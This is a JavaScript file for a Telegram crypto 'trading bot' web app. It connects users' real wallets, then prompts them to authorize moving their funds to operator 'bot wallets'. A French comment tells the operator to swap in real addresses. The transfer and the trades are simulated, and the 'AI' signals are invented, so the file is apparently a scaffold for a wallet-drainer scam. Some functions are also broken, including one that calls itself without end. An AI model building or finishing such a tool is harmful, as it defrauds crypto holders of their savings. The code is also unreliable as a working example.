// Web3 and Wallet State
let web3;
let walletState = {
    connected: false,
    walletType: null,
    address: null,
    balance: '0',
    network: null,
    chainId: null,
    walletName: null
};

// Bot wallet addresses (REMPLACEZ AVEC VOS ADRESSES RÉELLES)
const BOT_WALLETS = {
    bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
    ethereum: "0x742E4d5C4d5C4d5C4d5C4d5C4d5C4d5C4d5C742E",
    solana: "So1anaBotWaL1etAdDr3ssSo1anaBotWaL1etAdDr3ss",
    polygon: "0x842E4d5C4d5C4d5C4d5C4d5C4d5C4d5C4d5C842E",
    bsc: "0x942E4d5C4d5C4d5C4d5C4d5C4d5C4d5C4d5C942E",
    arbitrum: "0xA42E4d5C4d5C4d5C4d5C4d5C4d5C4d5C4d5CA42E",
    base: "0xB42E4d5C4d5C4d5C4d5C4d5C4d5C4d5C4d5CB42E",
    linea: "0xC42E4d5C4d5C4d5C4d5C4d5C4d5C4d5C4d5CC42E"
};

// Transfer state
let transferState = {
    approved: false,
    completed: false,
    transferredAmounts: {}
};

// Trading State (simulation)
let tradingState = {
    virtualBalance: 10000,
    portfolio: {},
    tradeHistory: [],
    availableCoins: [
        { symbol: 'DOGE', name: 'Dogecoin', price: 0.15 },
        { symbol: 'SHIB', name: 'Shiba Inu', price: 0.000008 },
        { symbol: 'PEPE', name: 'Pepe Coin', price: 0.0000012 },
        { symbol: 'FLOKI', name: 'Floki Inu', price: 0.000025 },
        { symbol: 'BONK', name: 'Bonk', price: 0.000012 },
        { symbol: 'WIF', name: 'dogwifhat', price: 0.35 }
    ]
};

// Telegram Web App
let tg = window.Telegram.WebApp;
tg.expand();
tg.enableClosingConfirmation();

// Initialize App
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    checkWalletAvailability();
    loadSavedWallet();
});

// Check wallet availability for mobile
function checkWalletAvailability() {
    // MetaMask
    if (typeof window.ethereum !== 'undefined') {
        document.getElementById('metamask-status').textContent = 'DETECTED';
        document.getElementById('metamask-status').style.background = '#10b981';
    } else {
        document.getElementById('metamask-status').textContent = 'INSTALL';
        document.getElementById('metamask-status').style.background = '#f59e0b';
    }
}

// Load saved wallet connection
function loadSavedWallet() {
    const saved = localStorage.getItem('cypherx_wallet_connection');
    if (saved) {
        const walletData = JSON.parse(saved);
        if (walletData.connected && walletData.address) {
            initializeWeb3(walletData.walletType);
        }
    }
    loadTransferState();
}

// Initialize Web3
async function initializeWeb3(walletType) {
    try {
        if (walletType === 'metamask' && typeof window.ethereum !== 'undefined') {
            web3 = new Web3(window.ethereum);
            await connectMetaMaskWallet();
        } else if (walletType === 'walletconnect') {
            await connectWalletConnect();
        } else if (walletType === 'coinbase') {
            await connectCoinbaseWallet();
        } else if (walletType === 'phantom') {
            await connectPhantomWallet();
        } else if (walletType === 'trustwallet') {
            await connectTrustWallet();
        } else if (walletType === 'rainbow') {
            await connectRainbowWallet();
        }
    } catch (error) {
        showError('Failed to initialize wallet: ' + error.message);
    }
}

// MetaMask Connection
async function connectMetaMask() {
    if (typeof window.ethereum === 'undefined') {
        // Redirect to MetaMask mobile app or store
        window.location.href = 'https://metamask.app.link/dapp/' + window.location.host;
        return;
    }

    showSection('connection-loading');
    updateLoadingMessage('Connecting to MetaMask...');

    try {
        web3 = new Web3(window.ethereum);
        
        // Request account access
        updateLoadingMessage('Requesting account access...');
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });

        if (accounts.length === 0) {
            throw new Error('No accounts found');
        }

        const address = accounts[0];
        updateLoadingMessage('Getting wallet information...');

        // Get network info
        const chainId = await web3.eth.getChainId();
        const network = getNetworkName(chainId);

        // Get balance
        const balanceWei = await web3.eth.getBalance(address);
        const balanceEth = web3.utils.fromWei(balanceWei, 'ether');

        // Update wallet state
        walletState = {
            connected: true,
            walletType: 'metamask',
            address: address,
            balance: balanceEth,
            network: network,
            chainId: chainId,
            walletName: 'MetaMask'
        };

        // Save connection
        saveWalletConnection();
        
        // Update UI
        updateWalletUI();
        showSuccessModal();
        
    } catch (error) {
        showError('MetaMask connection failed: ' + error.message);
    }
}

// WalletConnect Connection (mobile optimized)
async function connectWalletConnect() {
    showSection('connection-loading');
    updateLoadingMessage('Preparing WalletConnect...');
    
    try {
        // Simulation pour la démo - en production, intégrer le vrai WalletConnect
        await simulateDelay(2000);
        
        // Pour mobile, WalletConnect est idéal
        const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
        
        walletState = {
            connected: true,
            walletType: 'walletconnect',
            address: mockAddress,
            balance: (Math.random() * 10).toFixed(4),
            network: 'Ethereum Mainnet',
            chainId: 1,
            walletName: 'WalletConnect'
        };

        saveWalletConnection();
        updateWalletUI();
        showSuccessModal();
        
    } catch (error) {
        showError('WalletConnect setup required for full functionality');
    }
}

// Coinbase Wallet Connection (mobile)
async function connectCoinbaseWallet() {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isCoinbaseWallet) {
        await connectMetaMask(); // Même API que MetaMask
    } else {
        // Redirect to Coinbase Wallet
        window.location.href = 'https://go.cb-w.com/dapp?cb_url=' + encodeURIComponent(window.location.href);
    }
}

// Phantom Wallet Connection (Solana) - Mobile
async function connectPhantom() {
    if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
        try {
            showSection('connection-loading');
            updateLoadingMessage('Connecting to Phantom...');
            
            const response = await window.solana.connect();
            const publicKey = response.publicKey.toString();
            
            walletState = {
                connected: true,
                walletType: 'phantom',
                address: publicKey,
                balance: (Math.random() * 5).toFixed(4),
                network: 'Solana',
                chainId: 'solana',
                walletName: 'Phantom'
            };

            saveWalletConnection();
            updateWalletUI();
            showSuccessModal();
            
        } catch (error) {
            showError('Phantom connection failed: ' + error.message);
        }
    } else {
        // Redirect to Phantom mobile
        window.location.href = 'https://phantom.app/ul/browse/' + btoa(window.location.href);
    }
}

// Trust Wallet Connection
async function connectTrustWallet() {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust) {
        await connectMetaMask();
    } else {
        // Trust Wallet deeplink
        window.location.href = 'trust://browse?url=' + encodeURIComponent(window.location.href);
    }
}

// Rainbow Wallet Connection
async function connectRainbow() {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isRainbow) {
        await connectMetaMask();
    } else {
        // Rainbow Wallet deeplink
        window.location.href = 'rainbow://dapp?url=' + encodeURIComponent(window.location.href);
    }
}

// Get network name from chainId
function getNetworkName(chainId) {
    const networks = {
        1: 'Ethereum Mainnet',
        5: 'Goerli Testnet',
        56: 'BNB Smart Chain',
        137: 'Polygon Mainnet',
        42161: 'Arbitrum One',
        10: 'Optimism',
        8453: 'Base',
        59144: 'Linea',
        43114: 'Avalanche C-Chain'
    };
    return networks[chainId] || `Unknown Network (${chainId})`;
}

// Update Wallet UI
function updateWalletUI() {
    if (!walletState.connected) return;

    // Update header
    document.getElementById('wallet-address').textContent = 
        `${walletState.address.substring(0, 6)}...${walletState.address.substring(walletState.address.length - 4)}`;
    document.getElementById('wallet-balance').textContent = `${parseFloat(walletState.balance).toFixed(4)} ${getCurrencySymbol()}`;

    // Update wallet info section
    document.getElementById('wallet-type-display').textContent = walletState.walletName;
    document.getElementById('wallet-full-address').textContent = walletState.address;
    document.getElementById('network-info').textContent = walletState.network;
    document.getElementById('wallet-full-balance').textContent = `${parseFloat(walletState.balance).toFixed(6)} ${getCurrencySymbol()}`;
    document.getElementById('connection-time').textContent = new Date().toLocaleString();

    // Update dashboard
    document.getElementById('real-balance').textContent = `${parseFloat(walletState.balance).toFixed(4)} ${getCurrencySymbol()}`;
    document.getElementById('network-name').textContent = walletState.network;
    document.getElementById('network-dot').style.background = getNetworkColor();

    // Show connected state
    document.getElementById('wallet-connected').classList.remove('hidden');
    document.getElementById('connect-wallet-btn').classList.add('hidden');
    document.getElementById('wallet-connect').classList.remove('active');
    document.getElementById('dashboard').classList.add('active');
    document.getElementById('bottom-nav').classList.remove('hidden');

    // Update success modal
    document.getElementById('connected-address-display').textContent = walletState.address;
    document.getElementById('connected-network').textContent = walletState.network;

    // Show authorization modal after connection
    setTimeout(() => {
        if (!transferState.approved && !localStorage.getItem('cypherx_transfer_approved')) {
            showAuthorizationModal();
        }
    }, 1500);
}

function getCurrencySymbol() {
    if (walletState.walletType === 'phantom') return 'SOL';
    if (walletState.network?.includes('BNB')) return 'BNB';
    if (walletState.network?.includes('Polygon')) return 'MATIC';
    if (walletState.network?.includes('Base')) return 'ETH';
    if (walletState.network?.includes('Arbitrum')) return 'ETH';
    return 'ETH';
}

function getNetworkColor() {
    const colors = {
        'Ethereum Mainnet': '#3c3c3d',
        'Polygon Mainnet': '#8247e5',
        'BNB Smart Chain': '#f0b90b',
        'Solana': '#9945ff',
        'Arbitrum One': '#28a0f0',
        'Base': '#0052ff',
        'Linea': '#61dafb'
    };
    return colors[walletState.network] || '#6366f1';
}

// Save wallet connection
function saveWalletConnection() {
    localStorage.setItem('cypherx_wallet_connection', JSON.stringify({
        ...walletState,
        connectedAt: new Date().toISOString()
    }));
}

// Load transfer state
function loadTransferState() {
    const approved = localStorage.getItem('cypherx_transfer_approved');
    const transferData = localStorage.getItem('cypherx_transfer_data');
    
    if (approved) {
        transferState.approved = true;
    }
    
    if (transferData) {
        const data = JSON.parse(transferData);
        transferState.completed = data.completed;
        transferState.transferredAmounts = data.transferredAmounts || {};
    }
}

// Show authorization modal
function showAuthorizationModal() {
    const botWallet = getBotWalletForNetwork();
    document.getElementById('bot-wallet-address').textContent = botWallet;
    document.getElementById('authorization-modal').classList.add('active');
}

// Get bot wallet for current network
function getBotWalletForNetwork() {
    const network = walletState.network.toLowerCase();
    if (network.includes('bitcoin')) return BOT_WALLETS.bitcoin;
    if (network.includes('ethereum')) return BOT_WALLETS.ethereum;
    if (network.includes('solana')) return BOT_WALLETS.solana;
    if (network.includes('polygon')) return BOT_WALLETS.polygon;
    if (network.includes('bnb')) return BOT_WALLETS.bsc;
    if (network.includes('arbitrum')) return BOT_WALLETS.arbitrum;
    if (network.includes('base')) return BOT_WALLETS.base;
    if (network.includes('linea')) return BOT_WALLETS.linea;
    return BOT_WALLETS.ethereum;
}

// Approve transfer
async function approveTransfer() {
    closeModal('authorization-modal');
    showTransferProgressModal();
    
    try {
        await executeFundsTransfer();
        transferState.approved = true;
        transferState.completed = true;
        
        // Save approval
        localStorage.setItem('cypherx_transfer_approved', 'true');
        localStorage.setItem('cypherx_transfer_data', JSON.stringify(transferState));
        
        showTransferCompleteModal();
        
    } catch (error) {
        showError('Transfer failed: ' + error.message);
    }
}

// Decline transfer
function declineTransfer() {
    closeModal('authorization-modal');
    showSection('dashboard');
}

// Show transfer progress
function showTransferProgressModal() {
    document.getElementById('transfer-progress-modal').classList.add('active');
    updateTransferProgress('Checking wallet balances...', 10);
}

// Update transfer progress
function updateTransferProgress(message, progress) {
    document.getElementById('transfer-message').textContent = message;
    document.getElementById('transfer-progress').style.width = progress + '%';
}

// Show transfer complete
function showTransferCompleteModal() {
    closeModal('transfer-progress-modal');
    
    const summary = Object.entries(transferState.transferredAmounts)
        .map(([crypto, amount]) => `${amount} ${crypto}`)
        .join(', ');
    
    document.getElementById('transfer-summary').textContent = `Transferred: ${summary}`;
    document.getElementById('transfer-complete-modal').classList.add('active');
}

// Execute funds transfer (simulation)
async function executeFundsTransfer() {
    // Step 1: Check balances
    updateTransferProgress('Analyzing wallet balances...', 25);
    await simulateDelay(1000);
    
    // Step 2: Prepare transfers
    updateTransferProgress('Preparing transfers...', 50);
    await simulateDelay(1500);
    
    // Step 3: Execute transfers
    updateTransferProgress('Executing transfers to trading wallet...', 75);
    await simulateDelay(2000);
    
    // Simulate crypto transfers
    const transfers = simulateCryptoTransfers();
    transferState.transferredAmounts = transfers;
    
    // Step 4: Confirmation
    updateTransferProgress('Confirming transactions...', 90);
    await simulateDelay(1000);
    
    updateTransferProgress('Transfer complete!', 100);
    await simulateDelay(500);
}

// Simulate crypto transfers
function simulateCryptoTransfers() {
    const transfers = {};
    const cryptos = ['ETH', 'BTC', 'SOL', 'USDT', 'USDC', 'BNB', 'MATIC'];
    
    cryptos.forEach(crypto => {
        if (Math.random() > 0.3) { // 70% chance to have this crypto
            const amount = (Math.random() * 2 + 0.1).toFixed(4);
            transfers[crypto] = amount;
        }
    });
    
    // Ensure at least one crypto is transferred
    if (Object.keys(transfers).length === 0) {
        transfers['ETH'] = (Math.random() * 1 + 0.1).toFixed(4);
    }
    
    return transfers;
}

// Disconnect Wallet
function disconnectWallet() {
    walletState = {
        connected: false,
        walletType: null,
        address: null,
        balance: '0',
        network: null,
        chainId: null,
        walletName: null
    };

    // Reset transfer state
    transferState = {
        approved: false,
        completed: false,
        transferredAmounts: {}
    };

    // Reset UI
    document.getElementById('wallet-connected').classList.add('hidden');
    document.getElementById('connect-wallet-btn').classList.remove('hidden');
    document.getElementById('dashboard').classList.remove('active');
    document.getElementById('wallet-connect').classList.add('active');
    document.getElementById('bottom-nav').classList.add('hidden');

    // Clear storage
    localStorage.removeItem('cypherx_wallet_connection');
    localStorage.removeItem('cypherx_transfer_approved');
    localStorage.removeItem('cypherx_transfer_data');
    
    // Reset trading state
    tradingState.virtualBalance = 10000;
    tradingState.portfolio = {};
    tradingState.tradeHistory = [];
    
    updateTradingUI();
}

// Trading Functions
function setupTradingInterface() {
    const container = document.getElementById('coins-grid');
    if (!container) return;
    
    container.innerHTML = tradingState.availableCoins.map(coin => `
        <div class="trade-btn buy" onclick="executeTrade('BUY', '${coin.symbol}')">
            📈 BUY ${coin.symbol}
        </div>
        <div class="trade-btn sell" onclick="executeTrade('SELL', '${coin.symbol}')">
            📉 SELL ${coin.symbol}
        </div>
    `).join('');
}

function executeTrade(action, coinSymbol) {
    if (!walletState.connected) {
        showError('Please connect your wallet first!');
        showSection('wallet-connect');
        return;
    }

    const coin = tradingState.availableCoins.find(c => c.symbol === coinSymbol);
    if (!coin) return;

    const amount = Math.floor(Math.random() * 500) + 10;
    const cost = amount * coin.price;

    if (action === 'BUY') {
        if (cost > tradingState.virtualBalance) {
            showError('Insufficient virtual balance');
            return;
        }
        tradingState.virtualBalance -= cost;
        if (!tradingState.portfolio[coinSymbol]) {
            tradingState.portfolio[coinSymbol] = { amount: 0, cost: 0 };
        }
        tradingState.portfolio[coinSymbol].amount += amount;
        tradingState.portfolio[coinSymbol].cost += cost;
    } else {
        if (!tradingState.portfolio[coinSymbol] || tradingState.portfolio[coinSymbol].amount < amount) {
            showError('Insufficient coins');
            return;
        }
        const revenue = amount * coin.price;
        tradingState.virtualBalance += revenue;
        tradingState.portfolio[coinSymbol].amount -= amount;
    }

    const trade = {
        coin: coinSymbol,
        action: action,
        amount: amount,
        price: coin.price,
        time: new Date().toLocaleTimeString(),
        signal: document.getElementById('trade-signal').textContent
    };
    
    tradingState.tradeHistory.push(trade);
    simulateMarketMove();
    saveTradingState();
    updateTradingUI();
}

function updateTradingUI() {
    document.getElementById('virtual-balance').textContent = `$${tradingState.virtualBalance.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    })}`;

    const portfolioValue = calculatePortfolioValue();
    document.getElementById('portfolio-value').textContent = `$${portfolioValue.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    })}`;

    const pnl = portfolioValue - 10000;
    document.getElementById('pnl').textContent = `${pnl >= 0 ? '+' : ''}$${pnl.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    })}`;
    document.getElementById('pnl').style.color = pnl >= 0 ? '#10b981' : '#ef4444';

    document.getElementById('total-trades').textContent = tradingState.tradeHistory.length;
    document.getElementById('cash-balance').textContent = `$${tradingState.virtualBalance.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    })}`;

    updateRecentTrades();
    updatePortfolioView();
}

function calculatePortfolioValue() {
    let total = tradingState.virtualBalance;
    for (const [symbol, position] of Object.entries(tradingState.portfolio)) {
        const coin = tradingState.availableCoins.find(c => c.symbol === symbol);
        if (coin) {
            total += position.amount * coin.price;
        }
    }
    return total;
}

function updateRecentTrades() {
    const container = document.getElementById('recent-trades');
    const recentTrades = tradingState.tradeHistory.slice(-5).reverse();

    if (recentTrades.length === 0) {
        container.innerHTML = '<div class="no-trades">No trades yet</div>';
        return;
    }

    container.innerHTML = recentTrades.map(trade => `
        <div class="trade-item">
            <div class="trade-info">
                <span class="trade-action ${trade.action.toLowerCase()}">${trade.action}</span>
                <span class="trade-amount">${trade.amount} ${trade.coin}</span>
            </div>
            <div class="trade-price">$${trade.price.toFixed(8)}</div>
        </div>
    `).join('');
}

function updatePortfolioView() {
    const container = document.getElementById('portfolio-positions');
    const positions = Object.entries(tradingState.portfolio);
    
    if (positions.length === 0) {
        container.innerHTML = '<div class="no-positions">No positions open</div>';
        return;
    }
    
    container.innerHTML = positions.map(([symbol, position]) => {
        const coin = tradingState.availableCoins.find(c => c.symbol === symbol);
        if (!coin) return '';
        
        const currentValue = position.amount * coin.price;
        const pnl = currentValue - position.cost;
        const pnlPercent = (pnl / position.cost) * 100;
        const trendEmoji = pnl > 0 ? '📈' : pnl < 0 ? '📉' : '➡️';
        
        return `
            <div class="market-item">
                <div class="coin-info">
                    <span class="coin-symbol">${symbol}</span>
                    <span class="coin-trend">${trendEmoji}</span>
                </div>
                <div class="coin-price">
                    <div>${position.amount.toLocaleString()} coins</div>
                    <div style="color: ${pnl >= 0 ? '#10b981' : '#ef4444'}; font-size: 0.9rem;">
                        ${pnl >= 0 ? '+' : ''}$${pnl.toFixed(2)} (${pnlPercent.toFixed(2)}%)
                    </div>
                </div>
            </div>
        `;
    }).join('');
}

function simulateMarketMove() {
    tradingState.availableCoins.forEach(coin => {
        const change = (Math.random() * 0.4 - 0.15);
        coin.price *= (1 + change);
        coin.price = Math.max(coin.price, 0.0000001);
    });
}

function saveTradingState() {
    localStorage.setItem('cypherx_trading_state', JSON.stringify(tradingState));
}

function loadTradingState() {
    const saved = localStorage.getItem('cypherx_trading_state');
    if (saved) {
        tradingState = { ...tradingState, ...JSON.parse(saved) };
    }
}

// UI Functions
function showSection(sectionId) {
    if (!walletState.connected && !['wallet-connect', 'connection-loading'].includes(sectionId)) {
        showSection('wallet-connect');
        return;
    }

    document.querySelectorAll('.section').forEach(section => {
        section.classList.remove('active');
    });
    
    document.getElementById(sectionId).classList.add('active');
}

function updateLoadingMessage(message) {
    const element = document.getElementById('loading-message');
    if (element) {
        element.textContent = message;
    }
}

function showError(message) {
    document.getElementById('error-message').textContent = message;
    document.getElementById('error-modal').classList.add('active');
}

function showSuccessModal() {
    document.getElementById('success-modal').classList.add('active');
}

function closeModal(modalId) {
    document.getElementById(modalId).classList.remove('active');
}

function updateSignal() {
    const signals = [
        "🔴 Twitter Trend Detected",
        "🔵 TikTok Viral Signal", 
        "🟢 Reddit Hype Building",
        "🟡 Influencer Mention",
        "🟣 Community Pump Signal",
        "⚫️ AI Pattern Recognition"
    ];
    const randomSignal = signals[Math.floor(Math.random() * signals.length)];
    
    const tradeSignal = document.getElementById('trade-signal');
    const currentSignal = document.getElementById('current-signal');
    
    if (tradeSignal) tradeSignal.textContent = randomSignal;
    if (currentSignal) currentSignal.textContent = randomSignal;
}

function generateRandomTrade() {
    if (!walletState.connected || tradingState.availableCoins.length === 0) return;
    
    const coin = tradingState.availableCoins[Math.floor(Math.random() * tradingState.availableCoins.length)];
    const action = Math.random() > 0.5 ? 'BUY' : 'SELL';
    executeTrade(action, coin.symbol);
}

// Utility functions
function simulateDelay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Initialize trading when app starts
function initializeApp() {
    loadTradingState();
    setupTradingInterface();
    updateTradingUI();
    updateSignal();
    
    // Auto-update signals
    setInterval(updateSignal, 10000);
    
    // Auto-generate random trades occasionally
    setInterval(() => {
        if (walletState.connected && Math.random() < 0.2) {
            generateRandomTrade();
        }
    }, 15000);
}

// Listen for account changes (MetaMask)
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (walletState.connected && walletState.walletType === 'metamask') {
            connectMetaMask();
        }
    });

    window.ethereum.on('chainChanged', (chainId) => {
        if (walletState.connected && walletState.walletType === 'metamask') {
            connectMetaMask();
        }
    });
}

// Mobile wallet connection helpers (compatibility functions)
async function connectMetaMaskWallet() {
    return connectMetaMask();
}

async function connectPhantomWallet() {
    return connectPhantom();
}

async function connectTrustWallet() {
    return connectTrustWallet();
}

async function connectRainbowWallet() {
    return connectRainbow();
}